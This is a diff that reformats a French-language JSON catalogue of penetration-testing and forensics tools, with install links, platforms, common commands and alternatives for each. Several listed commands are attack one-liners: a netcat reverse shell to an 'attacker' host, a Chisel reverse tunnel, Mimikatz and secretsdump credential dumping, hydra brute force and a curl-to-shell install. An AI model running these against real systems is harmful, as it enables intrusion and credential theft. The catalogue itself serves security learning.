@@ -7,9 +7,20 @@
     "installation": "apt install nmap",
     "documentation": "https://nmap.org/docs.html",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["nmap -sV target.com", "nmap -p- -A target.com", "nmap -sC -sV target.com"],
-    "alternatives": ["Masscan", "ZMap"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "nmap -sV target.com",
+      "nmap -p- -A target.com",
+      "nmap -sC -sV target.com"
+    ],
+    "alternatives": [
+      "Masscan",
+      "ZMap"
+    ]
   },
   {
     "nom": "Metasploit",
@@ -19,9 +30,19 @@
     "installation": "apt install metasploit-framework",
     "documentation": "https://docs.metasploit.com",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows"],
-    "commandes_courantes": ["msfconsole", "msfvenom -p windows/meterpreter/reverse_tcp", "search exploit"],
-    "alternatives": ["Immunity Canvas", "Core Impact"]
+    "plateforme": [
+      "Linux",
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "msfconsole",
+      "msfvenom -p windows/meterpreter/reverse_tcp",
+      "search exploit"
+    ],
+    "alternatives": [
+      "Immunity Canvas",
+      "Core Impact"
+    ]
   },
   {
     "nom": "Burp Suite",
@@ -31,9 +52,19 @@
     "installation": "https://portswigger.net/burp/communitydownload",
     "documentation": "https://portswigger.net/burp/documentation",
     "prix": "Gratuit/Payant",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["burpsuite", "burpsuite --project-file=project.burp"],
-    "alternatives": ["OWASP ZAP", "Acunetix"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "burpsuite",
+      "burpsuite --project-file=project.burp"
+    ],
+    "alternatives": [
+      "OWASP ZAP",
+      "Acunetix"
+    ]
   },
   {
     "nom": "Wireshark",
@@ -43,9 +74,20 @@
     "installation": "apt install wireshark",
     "documentation": "https://www.wireshark.org/docs/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["wireshark", "tshark -i eth0 -w capture.pcap", "tshark -r capture.pcap"],
-    "alternatives": ["Tcpdump", "NetworkMiner"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "wireshark",
+      "tshark -i eth0 -w capture.pcap",
+      "tshark -r capture.pcap"
+    ],
+    "alternatives": [
+      "Tcpdump",
+      "NetworkMiner"
+    ]
   },
   {
     "nom": "Hydra",
@@ -55,9 +97,18 @@
     "installation": "apt install hydra",
     "documentation": "https://tools.kali.org/password-attacks/hydra",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows"],
-    "commandes_courantes": ["hydra -l admin -P pass.txt ssh://target", "hydra -L users.txt -P pass.txt ftp://target"],
-    "alternatives": ["Medusa", "Hashcat"]
+    "plateforme": [
+      "Linux",
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "hydra -l admin -P pass.txt ssh://target",
+      "hydra -L users.txt -P pass.txt ftp://target"
+    ],
+    "alternatives": [
+      "Medusa",
+      "Hashcat"
+    ]
   },
   {
     "nom": "SQLmap",
@@ -67,9 +118,20 @@
     "installation": "apt install sqlmap",
     "documentation": "http://sqlmap.org/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["sqlmap -u 'http://target/?id=1' --dbs", "sqlmap -u 'http://target/?id=1' -D db -T users --dump", "sqlmap --batch --random-agent"],
-    "alternatives": ["jSQL", "Acunetix"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "sqlmap -u 'http://target/?id=1' --dbs",
+      "sqlmap -u 'http://target/?id=1' -D db -T users --dump",
+      "sqlmap --batch --random-agent"
+    ],
+    "alternatives": [
+      "jSQL",
+      "Acunetix"
+    ]
   },
   {
     "nom": "John the Ripper",
@@ -79,9 +141,20 @@
     "installation": "apt install john",
     "documentation": "https://www.openwall.com/john/doc/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["john hashes.txt", "john --wordlist=dict.txt --format=md5 hashes.txt", "john --show hashes.txt"],
-    "alternatives": ["Hashcat", "Cain & Abel"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "john hashes.txt",
+      "john --wordlist=dict.txt --format=md5 hashes.txt",
+      "john --show hashes.txt"
+    ],
+    "alternatives": [
+      "Hashcat",
+      "Cain & Abel"
+    ]
   },
   {
     "nom": "Aircrack-ng",
@@ -91,9 +164,18 @@
     "installation": "apt install aircrack-ng",
     "documentation": "https://www.aircrack-ng.org/",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["airmon-ng start wlan0", "airodump-ng wlan0mon", "aircrack-ng -w dict.txt *.cap"],
-    "alternatives": ["Kismet", "InSSIDer"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "airmon-ng start wlan0",
+      "airodump-ng wlan0mon",
+      "aircrack-ng -w dict.txt *.cap"
+    ],
+    "alternatives": [
+      "Kismet",
+      "InSSIDer"
+    ]
   },
   {
     "nom": "Gobuster",
@@ -103,9 +185,20 @@
     "installation": "apt install gobuster",
     "documentation": "https://github.com/OJ/gobuster",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["gobuster dir -u http://target -w wordlist.txt", "gobuster dns -d target.com -w wordlist.txt", "gobuster vhost -u http://target -w wordlist.txt"],
-    "alternatives": ["ffuf", "Dirbuster"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "gobuster dir -u http://target -w wordlist.txt",
+      "gobuster dns -d target.com -w wordlist.txt",
+      "gobuster vhost -u http://target -w wordlist.txt"
+    ],
+    "alternatives": [
+      "ffuf",
+      "Dirbuster"
+    ]
   },
   {
     "nom": "The Harvester",
@@ -115,9 +208,19 @@
     "installation": "apt install theharvester",
     "documentation": "https://github.com/laramies/theHarvester",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["theHarvester -d target.com -l 100 -b google", "theHarvester -d target.com -b all"],
-    "alternatives": ["Shodan", "Recon-ng"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "theHarvester -d target.com -l 100 -b google",
+      "theHarvester -d target.com -b all"
+    ],
+    "alternatives": [
+      "Shodan",
+      "Recon-ng"
+    ]
   },
   {
     "nom": "Hashcat",
@@ -127,9 +230,20 @@
     "installation": "apt install hashcat",
     "documentation": "https://hashcat.net/wiki/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["hashcat -m 0 hashes.txt dict.txt", "hashcat -m 1000 -a 0 hashes.txt dict.txt", "hashcat -m 1800 hashes.txt dict.txt"],
-    "alternatives": ["John", "oclHashcat"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "hashcat -m 0 hashes.txt dict.txt",
+      "hashcat -m 1000 -a 0 hashes.txt dict.txt",
+      "hashcat -m 1800 hashes.txt dict.txt"
+    ],
+    "alternatives": [
+      "John",
+      "oclHashcat"
+    ]
   },
   {
     "nom": "Mimikatz",
@@ -139,9 +253,18 @@
     "installation": "Download: https://github.com/gentilkiwi/mimikatz",
     "documentation": "https://github.com/gentilkiwi/mimikatz/wiki",
     "prix": "Gratuit",
-    "plateforme": ["Windows"],
-    "commandes_courantes": ["privilege::debug", "sekurlsa::logonpasswords", "lsadump::sam"],
-    "alternatives": ["Procdump", "LaZagne"]
+    "plateforme": [
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "privilege::debug",
+      "sekurlsa::logonpasswords",
+      "lsadump::sam"
+    ],
+    "alternatives": [
+      "Procdump",
+      "LaZagne"
+    ]
   },
   {
     "nom": "Nikto",
@@ -151,9 +274,20 @@
     "installation": "apt install nikto",
     "documentation": "https://cirt.net/Nikto2",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["nikto -h http://target", "nikto -h http://target -p 8080", "nikto -h http://target -Tuning 123"],
-    "alternatives": ["Acunetix", "Nessus"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "nikto -h http://target",
+      "nikto -h http://target -p 8080",
+      "nikto -h http://target -Tuning 123"
+    ],
+    "alternatives": [
+      "Acunetix",
+      "Nessus"
+    ]
   },
   {
     "nom": "Responder",
@@ -163,9 +297,18 @@
     "installation": "apt install responder",
     "documentation": "https://github.com/lgandx/Responder",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows"],
-    "commandes_courantes": ["responder -I eth0 -wrf", "responder -I eth0 -wrfv"],
-    "alternatives": ["Inveigh", "Mitm6"]
+    "plateforme": [
+      "Linux",
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "responder -I eth0 -wrf",
+      "responder -I eth0 -wrfv"
+    ],
+    "alternatives": [
+      "Inveigh",
+      "Mitm6"
+    ]
   },
   {
     "nom": "CrackMapExec",
@@ -175,9 +318,18 @@
     "installation": "apt install crackmapexec",
     "documentation": "https://wiki.porchetta.industries/",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["crackmapexec smb target -u user -p pass", "crackmapexec smb target -u user -H hash", "crackmapexec smb target -u users.txt -p passwords.txt"],
-    "alternatives": ["Impacket", "Evil-WinRM"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "crackmapexec smb target -u user -p pass",
+      "crackmapexec smb target -u user -H hash",
+      "crackmapexec smb target -u users.txt -p passwords.txt"
+    ],
+    "alternatives": [
+      "Impacket",
+      "Evil-WinRM"
+    ]
   },
   {
     "nom": "Impacket",
@@ -187,9 +339,20 @@
     "installation": "pip install impacket",
     "documentation": "https://github.com/SecureAuthCorp/impacket",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["psexec.py domain/user@target", "secretsdump.py domain/user@target", "GetNPUsers.py domain/ -usersfile users.txt"],
-    "alternatives": ["CrackMapExec", "Evil-WinRM"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "psexec.py domain/user@target",
+      "secretsdump.py domain/user@target",
+      "GetNPUsers.py domain/ -usersfile users.txt"
+    ],
+    "alternatives": [
+      "CrackMapExec",
+      "Evil-WinRM"
+    ]
   },
   {
     "nom": "Enum4linux",
@@ -199,9 +362,18 @@
     "installation": "apt install enum4linux",
     "documentation": "https://github.com/CiscoCXSecurity/enum4linux",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["enum4linux -a target", "enum4linux -U target", "enum4linux -S target"],
-    "alternatives": ["smbclient", "rpcclient"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "enum4linux -a target",
+      "enum4linux -U target",
+      "enum4linux -S target"
+    ],
+    "alternatives": [
+      "smbclient",
+      "rpcclient"
+    ]
   },
   {
     "nom": "LinPEAS",
@@ -211,9 +383,17 @@
     "installation": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
     "documentation": "https://github.com/carlospolop/PEASS-ng",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["./linpeas.sh", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"],
-    "alternatives": ["LinEnum", "linux-exploit-suggester"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "./linpeas.sh",
+      "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+    ],
+    "alternatives": [
+      "LinEnum",
+      "linux-exploit-suggester"
+    ]
   },
   {
     "nom": "WinPEAS",
@@ -223,9 +403,17 @@
     "installation": "Download: https://github.com/carlospolop/PEASS-ng/releases",
     "documentation": "https://github.com/carlospolop/PEASS-ng",
     "prix": "Gratuit",
-    "plateforme": ["Windows"],
-    "commandes_courantes": ["winPEASany.exe", "winPEASx64.exe"],
-    "alternatives": ["PowerUp", "Sherlock"]
+    "plateforme": [
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "winPEASany.exe",
+      "winPEASx64.exe"
+    ],
+    "alternatives": [
+      "PowerUp",
+      "Sherlock"
+    ]
   },
   {
     "nom": "Bloodhound",
@@ -235,9 +423,19 @@
     "installation": "Download: https://github.com/BloodHoundAD/BloodHound",
     "documentation": "https://github.com/BloodHoundAD/BloodHound/wiki",
     "prix": "Gratuit",
-    "plateforme": ["Windows", "Linux"],
-    "commandes_courantes": ["BloodHound.exe", "SharpHound.ps1", "bloodhound-python -d domain.local -u user -p pass -c all"],
-    "alternatives": ["ADExplorer", "Ping Castle"]
+    "plateforme": [
+      "Windows",
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "BloodHound.exe",
+      "SharpHound.ps1",
+      "bloodhound-python -d domain.local -u user -p pass -c all"
+    ],
+    "alternatives": [
+      "ADExplorer",
+      "Ping Castle"
+    ]
   },
   {
     "nom": "Empire",
@@ -247,9 +445,18 @@
     "installation": "git clone https://github.com/BC-SECURITY/Empire.git",
     "documentation": "https://github.com/BC-SECURITY/Empire/wiki",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["python empire", "usemodule", "run"],
-    "alternatives": ["Cobalt Strike", "Havoc"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "python empire",
+      "usemodule",
+      "run"
+    ],
+    "alternatives": [
+      "Cobalt Strike",
+      "Havoc"
+    ]
   },
   {
     "nom": "Wfuzz",
@@ -259,9 +466,20 @@
     "installation": "apt install wfuzz",
     "documentation": "https://wfuzz.readthedocs.io/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["wfuzz -c -z file,wordlist.txt http://target/FUZZ", "wfuzz -c -z file,wordlist.txt -d 'user=FUZZ' http://target", "wfuzz -c --hc 404 -z file,wordlist.txt http://target/FUZZ"],
-    "alternatives": ["ffuf", "Burp Intruder"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "wfuzz -c -z file,wordlist.txt http://target/FUZZ",
+      "wfuzz -c -z file,wordlist.txt -d 'user=FUZZ' http://target",
+      "wfuzz -c --hc 404 -z file,wordlist.txt http://target/FUZZ"
+    ],
+    "alternatives": [
+      "ffuf",
+      "Burp Intruder"
+    ]
   },
   {
     "nom": "ffuf",
@@ -271,9 +489,20 @@
     "installation": "apt install ffuf",
     "documentation": "https://github.com/ffuf/ffuf",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["ffuf -u http://target/FUZZ -w wordlist.txt", "ffuf -u http://target/ -H 'X-API-Key: FUZZ' -w keys.txt", "ffuf -u http://FUZZ.target.com -w wordlist.txt"],
-    "alternatives": ["Wfuzz", "Intruder"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "ffuf -u http://target/FUZZ -w wordlist.txt",
+      "ffuf -u http://target/ -H 'X-API-Key: FUZZ' -w keys.txt",
+      "ffuf -u http://FUZZ.target.com -w wordlist.txt"
+    ],
+    "alternatives": [
+      "Wfuzz",
+      "Intruder"
+    ]
   },
   {
     "nom": "Nuclei",
@@ -283,9 +512,20 @@
     "installation": "go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
     "documentation": "https://nuclei.projectdiscovery.io/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["nuclei -u http://target", "nuclei -l urls.txt", "nuclei -t cves/ -l urls.txt"],
-    "alternatives": ["Nessus", "OpenVAS"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "nuclei -u http://target",
+      "nuclei -l urls.txt",
+      "nuclei -t cves/ -l urls.txt"
+    ],
+    "alternatives": [
+      "Nessus",
+      "OpenVAS"
+    ]
   },
   {
     "nom": "Subfinder",
@@ -295,9 +535,20 @@
     "installation": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
     "documentation": "https://github.com/projectdiscovery/subfinder",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["subfinder -d target.com", "subfinder -d target.com -all", "subfinder -dL domains.txt -o output.txt"],
-    "alternatives": ["Amass", "Assetfinder"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "subfinder -d target.com",
+      "subfinder -d target.com -all",
+      "subfinder -dL domains.txt -o output.txt"
+    ],
+    "alternatives": [
+      "Amass",
+      "Assetfinder"
+    ]
   },
   {
     "nom": "Amass",
@@ -307,9 +558,20 @@
     "installation": "apt install amass",
     "documentation": "https://github.com/OWASP/Amass",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["amass enum -d target.com", "amass intel -whois -d target.com", "amass enum -passive -d target.com"],
-    "alternatives": ["Subfinder", "Assetfinder"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "amass enum -d target.com",
+      "amass intel -whois -d target.com",
+      "amass enum -passive -d target.com"
+    ],
+    "alternatives": [
+      "Subfinder",
+      "Assetfinder"
+    ]
   },
   {
     "nom": "Masscan",
@@ -319,9 +581,19 @@
     "installation": "apt install masscan",
     "documentation": "https://github.com/robertdavidgraham/masscan",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["masscan -p80,443 10.0.0.0/8", "masscan -p1-65535 target.com --rate=10000"],
-    "alternatives": ["Nmap", "ZMap"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "masscan -p80,443 10.0.0.0/8",
+      "masscan -p1-65535 target.com --rate=10000"
+    ],
+    "alternatives": [
+      "Nmap",
+      "ZMap"
+    ]
   },
   {
     "nom": "Netcat",
@@ -331,9 +603,20 @@
     "installation": "apt install netcat",
     "documentation": "https://nc110.sourceforge.io/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["nc -lvnp 4444", "nc target 80", "nc -e /bin/bash attacker 4444"],
-    "alternatives": ["Socat", "Ncat"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "nc -lvnp 4444",
+      "nc target 80",
+      "nc -e /bin/bash attacker 4444"
+    ],
+    "alternatives": [
+      "Socat",
+      "Ncat"
+    ]
   },
   {
     "nom": "Socat",
@@ -343,9 +626,19 @@
     "installation": "apt install socat",
     "documentation": "http://www.dest-unreach.org/socat/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["socat TCP-LISTEN:8080,fork TCP:target:80", "socat file:`tty`,raw,echo=0 tcp-listen:4444"],
-    "alternatives": ["Netcat", "Ncat"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "socat TCP-LISTEN:8080,fork TCP:target:80",
+      "socat file:`tty`,raw,echo=0 tcp-listen:4444"
+    ],
+    "alternatives": [
+      "Netcat",
+      "Ncat"
+    ]
   },
   {
     "nom": "Chisel",
@@ -355,9 +648,19 @@
     "installation": "go install github.com/jpillora/chisel@latest",
     "documentation": "https://github.com/jpillora/chisel",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["chisel server -p 8080 --reverse", "chisel client attacker:8080 R:4444:localhost:4444"],
-    "alternatives": ["SSH", "Ngrok"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "chisel server -p 8080 --reverse",
+      "chisel client attacker:8080 R:4444:localhost:4444"
+    ],
+    "alternatives": [
+      "SSH",
+      "Ngrok"
+    ]
   },
   {
     "nom": "Kali Linux",
@@ -367,9 +670,17 @@
     "installation": "Download ISO: https://www.kali.org/",
     "documentation": "https://www.kali.org/docs/",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["apt update && apt upgrade", "apt install tool-name"],
-    "alternatives": ["Parrot OS", "BlackArch"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "apt update && apt upgrade",
+      "apt install tool-name"
+    ],
+    "alternatives": [
+      "Parrot OS",
+      "BlackArch"
+    ]
   },
   {
     "nom": "BeEF",
@@ -379,9 +690,18 @@
     "installation": "git clone https://github.com/beefproject/beef.git",
     "documentation": "https://github.com/beefproject/beef/wiki",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["ruby beef", "Créer hook", "Exécuter modules"],
-    "alternatives": ["XSSHunter", "Polr"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "ruby beef",
+      "Créer hook",
+      "Exécuter modules"
+    ],
+    "alternatives": [
+      "XSSHunter",
+      "Polr"
+    ]
   },
   {
     "nom": "OWASP ZAP",
@@ -391,9 +711,19 @@
     "installation": "apt install zaproxy",
     "documentation": "https://www.zaproxy.org/docs/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["zaproxy -cmd -quickurl http://target -quickout report.html", "zap.sh -daemon -port 8080"],
-    "alternatives": ["Burp Suite", "Acunetix"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "zaproxy -cmd -quickurl http://target -quickout report.html",
+      "zap.sh -daemon -port 8080"
+    ],
+    "alternatives": [
+      "Burp Suite",
+      "Acunetix"
+    ]
   },
   {
     "nom": "Volatility",
@@ -403,9 +733,20 @@
     "installation": "apt install volatility3",
     "documentation": "https://volatility-labs.blogspot.com/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["vol -f memory.dump windows.pslist", "vol -f memory.dump windows.filescan", "vol -f memory.dump windows.netscan"],
-    "alternatives": ["WinDbg", "GDB"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "vol -f memory.dump windows.pslist",
+      "vol -f memory.dump windows.filescan",
+      "vol -f memory.dump windows.netscan"
+    ],
+    "alternatives": [
+      "WinDbg",
+      "GDB"
+    ]
   },
   {
     "nom": "Scapy",
@@ -415,9 +756,20 @@
     "installation": "pip install scapy",
     "documentation": "https://scapy.readthedocs.io/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["python3 -i script.py", "send(IP(dst='target')/ICMP())", "sniff(filter='tcp')"],
-    "alternatives": ["PyShark", "Dpkt"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "python3 -i script.py",
+      "send(IP(dst='target')/ICMP())",
+      "sniff(filter='tcp')"
+    ],
+    "alternatives": [
+      "PyShark",
+      "Dpkt"
+    ]
   },
   {
     "nom": "Splunk",
@@ -427,9 +779,18 @@
     "installation": "Download: https://www.splunk.com/en_us/download.html",
     "documentation": "https://docs.splunk.com/",
     "prix": "Gratuit/Payant",
-    "plateforme": ["Linux", "Windows"],
-    "commandes_courantes": ["./splunkd start", "Web UI: http://localhost:8000"],
-    "alternatives": ["Elastic Stack", "Sumo Logic"]
+    "plateforme": [
+      "Linux",
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "./splunkd start",
+      "Web UI: http://localhost:8000"
+    ],
+    "alternatives": [
+      "Elastic Stack",
+      "Sumo Logic"
+    ]
   },
   {
     "nom": "Ghidra",
@@ -439,9 +800,19 @@
     "installation": "Download: https://ghidra-sre.org/",
     "documentation": "https://ghidra-sre.org/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["ghidra &", "analyzeHeadless"],
-    "alternatives": ["IDA Pro", "Radare2"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "ghidra &",
+      "analyzeHeadless"
+    ],
+    "alternatives": [
+      "IDA Pro",
+      "Radare2"
+    ]
   },
   {
     "nom": "Radare2",
@@ -451,9 +822,20 @@
     "installation": "apt install radare2",
     "documentation": "https://radare.org/n/index.html",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["r2 binary.exe", "aaa", "pdf @ main"],
-    "alternatives": ["Ghidra", "IDA Pro"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "r2 binary.exe",
+      "aaa",
+      "pdf @ main"
+    ],
+    "alternatives": [
+      "Ghidra",
+      "IDA Pro"
+    ]
   },
   {
     "nom": "Searchsploit",
@@ -463,9 +845,18 @@
     "installation": "apt install exploitdb",
     "documentation": "https://www.exploit-db.com/searchsploit",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["searchsploit apache", "searchsploit -m 12345", "searchsploit -u"],
-    "alternatives": ["Exploit-DB", "Metasploit"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "searchsploit apache",
+      "searchsploit -m 12345",
+      "searchsploit -u"
+    ],
+    "alternatives": [
+      "Exploit-DB",
+      "Metasploit"
+    ]
   },
   {
     "nom": "Cobalt Strike",
@@ -475,9 +866,18 @@
     "installation": "Commercial: https://www.cobaltstrike.com/",
     "documentation": "https://www.cobaltstrike.com/support",
     "prix": "Payant",
-    "plateforme": ["Linux", "Windows"],
-    "commandes_courantes": ["./teamserver IP password profile", "beacon> shell command"],
-    "alternatives": ["Empire", "Havoc"]
+    "plateforme": [
+      "Linux",
+      "Windows"
+    ],
+    "commandes_courantes": [
+      "./teamserver IP password profile",
+      "beacon> shell command"
+    ],
+    "alternatives": [
+      "Empire",
+      "Havoc"
+    ]
   },
   {
     "nom": "Nessus",
@@ -487,9 +887,18 @@
     "installation": "Download: https://www.tenable.com/downloads/nessus",
     "documentation": "https://docs.tenable.com/nessus/",
     "prix": "Gratuit/Payant",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["Web UI: https://localhost:8834"],
-    "alternatives": ["OpenVAS", "Qualys"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "Web UI: https://localhost:8834"
+    ],
+    "alternatives": [
+      "OpenVAS",
+      "Qualys"
+    ]
   },
   {
     "nom": "OpenVAS",
@@ -499,9 +908,17 @@
     "installation": "apt install openvas",
     "documentation": "https://www.openvas.org/",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["gvm-setup", "Web UI: https://localhost:9392"],
-    "alternatives": ["Nessus", "Qualys"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "gvm-setup",
+      "Web UI: https://localhost:9392"
+    ],
+    "alternatives": [
+      "Nessus",
+      "Qualys"
+    ]
   },
   {
     "nom": "Yara",
@@ -511,9 +928,19 @@
     "installation": "apt install yara",
     "documentation": "https://yara.readthedocs.io/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["yara rules.yar file.exe", "yara -r rules.yar /path/to/scan"],
-    "alternatives": ["ClamAV", "THOR"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "yara rules.yar file.exe",
+      "yara -r rules.yar /path/to/scan"
+    ],
+    "alternatives": [
+      "ClamAV",
+      "THOR"
+    ]
   },
   {
     "nom": "CyberChef",
@@ -523,9 +950,18 @@
     "installation": "Web: https://gchq.github.io/CyberChef/",
     "documentation": "https://github.com/gchq/CyberChef",
     "prix": "Gratuit",
-    "plateforme": ["Online", "Docker"],
-    "commandes_courantes": ["Web interface", "docker run -p 8000:8000 mpepping/cyberchef"],
-    "alternatives": ["CryptTool", "010 Editor"]
+    "plateforme": [
+      "Online",
+      "Docker"
+    ],
+    "commandes_courantes": [
+      "Web interface",
+      "docker run -p 8000:8000 mpepping/cyberchef"
+    ],
+    "alternatives": [
+      "CryptTool",
+      "010 Editor"
+    ]
   },
   {
     "nom": "Binwalk",
@@ -535,9 +971,18 @@
     "installation": "apt install binwalk",
     "documentation": "https://github.com/ReFirmLabs/binwalk",
     "prix": "Gratuit",
-    "plateforme": ["Linux"],
-    "commandes_courantes": ["binwalk firmware.bin", "binwalk -e firmware.bin", "binwalk -Me firmware.bin"],
-    "alternatives": ["Firmware-Mod-Kit", "FACT"]
+    "plateforme": [
+      "Linux"
+    ],
+    "commandes_courantes": [
+      "binwalk firmware.bin",
+      "binwalk -e firmware.bin",
+      "binwalk -Me firmware.bin"
+    ],
+    "alternatives": [
+      "Firmware-Mod-Kit",
+      "FACT"
+    ]
   },
   {
     "nom": "Autopsy",
@@ -547,9 +992,18 @@
     "installation": "Download: https://www.autopsy.com/download/",
     "documentation": "https://www.autopsy.com/support/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["GUI Interface"],
